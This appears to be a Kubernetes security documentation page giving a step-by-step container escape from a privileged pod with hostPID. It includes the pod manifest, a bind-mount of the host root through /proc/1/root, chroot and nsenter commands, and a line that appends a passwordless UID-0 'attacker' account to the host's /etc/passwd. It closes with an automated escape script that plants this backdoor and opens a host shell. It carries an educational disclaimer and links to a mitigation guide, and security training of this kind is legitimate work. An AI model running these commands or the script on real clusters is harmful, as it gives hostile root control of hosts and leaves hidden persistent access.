---
sidebar_position: 8
title: "Container Escape Guide"
description: "Step-by-step guide on breaking out of a container and gaining control over the host system."
---

# Container Escape Guide

This guide provides a detailed walkthrough of escaping from a container to gain full control over the host system. The process involves mounting the host's filesystem, modifying critical system files, and entering the host's namespaces.

## **Warning: Security Risk**

**The information and the script included in this article are intended for educational and security research purposes only.** It demonstrates how an attacker can escape a container and gain access to the host system. Running this script on a production system or unauthorized environment can lead to **severe security breaches, data loss, and system compromise.**

**Use this script only in a controlled, isolated testing environment where you have explicit permission.** Misuse of this information may violate company policies or legal regulations.

**You are responsible for how you use this information.** Proceed with caution.

---

## Prerequisites

To successfully escape from a container, the following conditions must be met:

- The container must run as root (`runAsUser: 0`).
- `allowPrivilegeEscalation: true` must be enabled.
- `hostPID: true` must be set to share the host’s process namespace.
- The container must have access to `/proc/1/root`, which exposes the host’s root filesystem.
- The container must have permission to execute `mount --bind` and `chroot`.
- The `/proc` filesystem must be accessible from within the container.
- The container must be running in privileged mode (`privileged: true`).

## Step 1: Deploy a Test Pod with Required Privileges

To demonstrate container escape, use the following YAML file to create a privileged pod:

```yaml
apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    run: test
  name: test
spec:
  hostPID: true
  containers:
  - image: busybox
    command: ["sleep", "infinity"]
    securityContext:
      runAsUser: 0
      allowPrivilegeEscalation: true
      privileged: true
    name: test
    resources: {}
  dnsPolicy: ClusterFirst
  restartPolicy: Always
status: {}
```

Apply the pod to the cluster:

```bash
kubectl apply -f test-pod.yaml
```

## Step 2: Identify the Container Environment

Before attempting to escape, check if the container is running with elevated privileges and if it has access to the host's filesystem.

### Check the Container’s Mount Namespace

Run inside the container:

```bash
ls -l /proc/1/ns/mnt
```

Example output:

```
lrwxrwxrwx 1 root root 0 Mar 17 16:38 /proc/1/ns/mnt -> 'mnt:[4026535581]'
```

This confirms that the container is isolated in a separate mount namespace from the host.

## Step 3: Gain Access to the Host’s Root Filesystem

If the container has access to `/proc/1/root`, it may point to the actual root filesystem of the host.

Check if it exists:

```bash
ls /proc/1/root
```

Expected output:

```
bin   dev  home  lib32  libx32  mnt  proc  run   srv  tmp  var
boot  etc  lib   lib64  media   opt  root  sbin  sys  usr
```

If the output matches the expected host filesystem structure, proceed.

Now, bind-mount the host’s root filesystem inside the container:

```bash
mkdir /mnt/host
mount --bind /proc/1/root /mnt/host
```

Verify that the mount was successful:

```bash
ls /mnt/host
```

If you see `/bin`, `/etc`, `/var`, `/root`, etc., you have access to the host's filesystem.

## Step 4: Create a Root User on the Host

Now that we have access to the host’s root filesystem, modify `/etc/passwd` to create a root user.

```bash
echo 'attacker:x:0:0::/root:/bin/bash' >> /mnt/host/etc/passwd
```

This adds a new user `attacker` with UID 0 (root privileges).

To verify:

```bash
grep attacker /mnt/host/etc/passwd
```

Expected output:

```
attacker:x:0:0::/root:/bin/bash
```

## Step 5: Escape to the Host’s Root Namespace

### Option 1: Use `chroot` to Change Root

Now, attempt to switch to the host’s root filesystem:

```bash
chroot /mnt/host /bin/sh
```

If successful, running:

```bash
hostname
```

should return the host’s actual hostname.

If `chroot` fails with:

```
can't init_stub: Error { kind: Uncategorized, message: "no /proc/self/exe available. Is /proc mounted?" }
```

or

```
chroot: failed to run command '/bin/sh': No such file or directory
```

then the `/proc`, `/dev`, and `/sys` filesystems must be mounted first.

### Option 2: Bind-Mount Necessary Filesystems

If `chroot` fails, first mount the required system files:

```bash
mount --bind / /mnt/host
mount --bind /proc /mnt/host/proc
mount --bind /sys /mnt/host/sys
mount --bind /dev /mnt/host/dev
mount --bind /run /mnt/host/run
```

Then, try `chroot` again:

```bash
chroot /mnt/host /bin/sh
```

If successful, you are now operating inside the host system.

### Option 3: Use `nsenter` to Enter the Host’s Namespaces

If `chroot` still fails, forcefully enter the host’s namespaces using `nsenter`:

```bash
nsenter --target 1 --mount --uts --ipc --net --pid /bin/sh
```

## **Automated Container Escape Script**

The following script automates the process of escaping a container by:

- Entering the host’s namespaces.
- Mounting the host’s filesystem.
- Adding a new root user for persistence.
- Providing an interactive shell on the host.

```bash
#!/bin/sh

echo "[*] Checking if the container has access to the host's root filesystem..."
if [ ! -d "/proc/1/root" ]; then
    echo "[-] Cannot access /proc/1/root. Escape is not possible."
    exit 1
fi

echo "[+] Host root filesystem detected at /proc/1/root."

# Step 1: Ensure full namespace entry using exec nsenter
echo "[*] Attempting to enter the host's namespaces..."

exec nsenter --target 1 --mount --uts --ipc --net --pid --root=/proc/1/root /bin/sh -c '
    echo "[+] Successfully entered host namespaces."

    # Step 2: Modify /etc/passwd on the host to add an attacker user
    echo "[*] Adding attacker user to /etc/passwd..."
    echo "attacker:x:0:0::/root:/bin/bash" >> /etc/passwd

    echo "[+] Attacker user added. Verifying..."
    grep attacker /etc/passwd

    echo "[+] Escape complete. You are now inside the host."

    # Step 3: Verify the escape
    echo "[*] Checking system state..."
    echo "Hostname: $(hostname)"
    echo "User: $(whoami)"
    echo "[*] Checking if host kubelet process is visible..."
    ps aux | grep kubelet

    # Step 4: Open an interactive shell inside the host
    exec /bin/sh
'
```

## Conclusion

You successfully escaped the container by:

1. Deploying a privileged pod with `hostPID: true`.
2. Mounting the host’s root filesystem.
3. Adding a root user to `/etc/passwd`.
4. Using `chroot` or `nsenter` to fully break out of container isolation.

To learn how to prevent container escape vulnerabilities, refer to the mitigation guide:

➡ [Preventing Container Escape](https://geek-kb.github.io/k8s_security/docs/best_practices/cluster_setup_and_hardening/pod_security/container_escape_mitigation/)
